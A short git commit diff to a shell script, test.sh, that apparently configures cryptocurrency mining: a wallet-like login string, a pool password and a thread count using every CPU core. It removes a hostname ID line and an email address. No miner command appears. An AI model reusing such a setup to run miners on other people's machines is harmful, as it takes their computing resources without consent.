abfe042faec268317c9b7a95b1871b292c43d37f
Loaman1 <44247195+Loaman1@users.noreply.github.com>
2018-11-20 16:09:14 +0300

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,9 +1,7 @@
 #!/bin/bash
 
 login=46XYFkrVGBjUjFS891F17uivxsijPnen18WmBKdrgUWzjoVPyQFduYzQwAK61ox5oZK5QmhBRqK5cF8gJ1HC69R6M3NdQkY
-ID="$(hostname)"
-MAIL=mattgradon@gmail.com
-PASSWORD=instance
+PASSWORD=w=instance
 THREADS="$(nproc --all)"
 
 sleep 5
